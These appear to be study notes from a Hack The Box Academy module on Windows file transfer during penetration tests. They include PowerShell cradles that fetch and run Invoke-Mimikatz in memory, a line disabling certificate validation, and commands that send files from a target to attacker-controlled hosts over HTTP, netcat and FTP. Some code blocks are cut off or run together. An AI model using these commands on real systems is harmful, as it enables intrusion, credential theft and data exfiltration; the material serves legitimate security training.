There are many situations when transferring files to or from a target system is necessary. Image the following scenario:
> [!Note] **Setting the Stage**
>
>During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the [Application Control Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control). We perform our local enumeration manually and find that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege). We need to transfer a binary to our target machine to escalate privileges using the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool. We then try to use [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.

Understanding different ways to perform file transfers and how networks operate can help accomplish goals during an assessment. It's important to be aware of host ctrls that may prevent these actions, e.g. whitelisting or AV/EDR blocking specific apps or activities. File transfers are also affected by net devices such as fw, IDS, or IPS which can monitor or block particular ports or uncommon operations.

File transfer is a core feature of any OS, and many tools exist to achieve this. However, many of these tools may be blocked or monitored by diligent admins, and it is worth reviewing a range of techniques that may be possible in a given env.

This module covers these techniques that leverage tools and apps commonly avail on Win and Linux sys's. This is not an exhaustive list. The info w/i this module can also be used as a reference guide when working through other HtB Academy modules, as many of the in-module exercises will req students to transfer files to/from a target host or to/from the provided Pwnbox. Target Win and Linux machines are provided to complete a few hands-on exercises as part of the module. It is worth utilizing these targets to experiment w as many of the techniques demo'd in the module sectioned as possible. Observe the nuances b/w the diff transfer methods and note down situations where they would be helpful. Once completing this module, try out the various techniques in other HtB Academy modules and boxes and labs on the HtB main platform.
# File Transfer Methods
## Windows File Transfer Methods
### Introduction
The Win OS has evolved o/ the past few years, and new versions come w diff utils for file transfer operations. Understanding file transfer in Windows can help both atkrs and defenders. Atkrs can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. The [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) blog post is an example of an advanced persistent threat (APT).

The blog post starts by talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a sys to execute an atk. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the sys but runs in memory.

The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) w the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the atk. [Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png) ![[Pasted image 20240528120232.png]]
This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.

This section will discuss using some native Windows tools for download and upload operations. Later, this module will discuss `Living Off the Land` binaries on Windows and Linux and how to use them to perform file transfer operations.
### Download Operations
Suppose you have access to the machine `MS02`, and you need to download a file from your `Pwnbox` machine.
![[Pasted image 20240528121327.png]]
### PowerShell Base64 Encode & Decode
Depending on the file size we want to transfer, it is possible to use diff methods that do not req net comms. If terminal access is needed, encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content.

An essential step in using this method is to ensure the file you encode and decode is correct. We can use[md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calcs and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. The following cmd attempts to transfer a sample ssh key:
```pwnbox-check-ssh-key-md5-hash
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
```pwnbox-encode-ssh-key-to-base64
$ cat id_rsa |base64 -w 0;echo

```
Then copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```confirming-md5-hashes-match
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
Finally, confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5dum` does.
```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```
> [!Note] Important Note
> While this method is convenient, it's not always possible to use. Windows Cmd Line util (cmd.exe) has a max string length of 8,191 chars. Also, a web shell may err if you attempt to send extremely large strings.
#### PowerShell Web Downloads
Most companies allow `HTTP` and `HTTPS` outbound traf through the fw to allow employee productivity. Leveraging these transportation methods for file transfer operations is v convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like `.exe`), or only allow access to a list of whitelisted domains in more restricted networks.
PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS`, or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |

| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |

| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
#### PowerShell DownloadFile Method
The following cmd specifies the class name `Net.WebClient` and the `DownloadFile` method w the parameters corresponding to the URL of the target file to download and the output file name.
```file-download
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
#### PowerShell DownloadString - Fileless Method
As previously discussed, fileless atks work by using some OS functions to download the payload and execute it directly. PowerShell can also be used to perform fileless atks. Instead of downloading a PowerShell script to disk, use the following cmd to run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
`PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
`IEX` also accepts pipeline input:
`PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
#### PowerShell Invoke-WebRequests
From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also avail, but is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name:
`PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity w them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.
#### Common Erroes with PowerShell
There may be cases when the Internet Explorer first-launch config has not been completed, which prevents the download.![[Pasted image 20240528132656.png]]This can be bypassed using the parameter `-UseBasicParsing`:
```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the cert is not trusted, which can be bypassed w the following cmd:
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables apps and users to transfer files to and from remote servers.
SMB can be used to download files form your machine easily by creating an SMB server in your machine w [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move,` PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
```create-the-smb-server
$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
To download a file from the SMB server to the current working directory, use the following cmd:
```copy-file-from-smb-server
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
New versions of WIndows block unauth guest access, as the following cmd shows:
```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
One method to transfer files in this scenario is by setting a username and passwd using your Impacket SMB server and mount the SMB server on the target Windows machine:
```create-smb-server-with-username-passwd
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0

[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
```mount-smb-server
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```
> [!Note]
> It is also possible to mount the SMB server if an error is received when using the `copy filename \\IP\sharename` cmd.
### FTP Downloads
Another way to transfer files is using the `File Transfer Protocol` (`FTP`), which uses port TCP/21 and TCP/20. Use the FTP client or POwerShell `Net.WebClient` to download files from an FTP server.
Config an FTP server in the atk host using Python3 `pyftpdlib` module, which cmd be installed with the following cmd:
`$ sudo pip3 install pyftpdlib`
`pyftpdlib` default to port 2121, so you then have to config it to use port 21. Anonymous auth is enabled by default if a username and passwd is not set:
```setting-up-python3-ftp-server
$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
After the FTP server is set up, perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.
`PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
After getting a shell on a remote machine, that shell may not be interactive. In this case, create an FTP cmd file to download a file. First, create a file containing the desired cmds and then use the FTP client to use that file to download that file.
```creating-cmd-file
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt

### Upload Operations
There are also situations (e.g. passwd cracking, analysis, exfiltration, etc.) where it is important to upload files from a target machine into the atk host. The methods explained above can be used in reverse to accomplish this as explained in the following section:
#### PowerShell Base64 Encode and Decode
Now time to reverse everything explained above.

```
#### PowerShell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but the `Invoke-WebRequest` or `Invoke-RestMethod` cmds can be used to build your own upload function, given that you also have a web server that accepts uploads, which is not a default option in most common webserver utils.
For your web server, you can use [uploadserver](https://github.com/Densaugeo/uploadserver), which is an extended module of the Python [HTTP.server](https://docs.python.org/3/library/http.server.html) module, that includes a file upload page. The following cmds install, and starts the webserver:
```install-config-webserver-w-upload
$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
```start-webserver
$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now it is possible to use a PowerShell script (such as [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod`) to perform the upload operations. The `PSUpload.ps1` script accepts two parametes `-File`, which is used to specify the file path, and `-Uri`, the server URL where the file will be uploaded.
```powershell-script-upload-file
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
#### PowerShell Base64 Web Upload
Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together w Netcat, which is used to listen in on a specified port and send the file as a `POST` request. Finally, copy the output and use the base64 decode function to convert the base64 string into a file.
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
The base64 data is caught w Netcat and the base64 app is used w the decode option to convert the string to a file.
```shell-session
$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923

### SMB Uploads
Previously, it's been discussed that companies usually allow outbound traf using `HTTP` (`TCP/80`) and `HTTPS` (`TCP/443`) protocols. Commonly enterprises don't allow the `SMB` protocol (`TCP/445`) out of their internal network b/c this can open them up to potential atks. For more info, read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

An alternative is to run SMB o/ HTTP w `WebDav.WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918), which is an extension of HTTP, the internet protocol that web browsers and web servers use to comm w each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When using `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share avail, it will try to connect using HTTP. The following Wireshark capture attempts to connect to the file share `testing3`, and b/c it didn't find anything w `SMB`, it uses `HTTP`.![[Pasted image 20240528141512.png]]
#### Configuring WebDav Server
To set up a WebDav server, install two Python modules, `wsgidav` and `cheroot` (more about this implementation can be found [here](https://github.com/mar10/wsgidav)). After installing them, run the `wsgidav` app in the target dir.
```installing-webdav-python-modules
$ sudo pip3 install wsgidav cheroot

> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. e.g: \192.168.49.128\sharefolder

```
> [!Impotant Note]
> If there are no `SMB` (`TCP/445`) restrictions, you can use impacket-smbserver the same way it was set up for download operations.
### FTP Uploads
Uploading files using FTP is very similar to downloading files, by using PowerShell or the FTP client to complete the operation. Before starting your FTP Server using the Python module `pyftpdlib`, specify the `--write` option to allow clients to upload files to the atk host.
```shell-session
$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async

[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```
Now to use PowerShell upload function to upload a file to the FTP Server.
```powershell-upload-file
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
```create-cmd-file
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts

```
### Recap
Several methods were discussed in the section for downloading and uploading files using Windows native tools, but there's more. The following sections, will discuss other mechanisms and tools needed to perform file transfer operations.
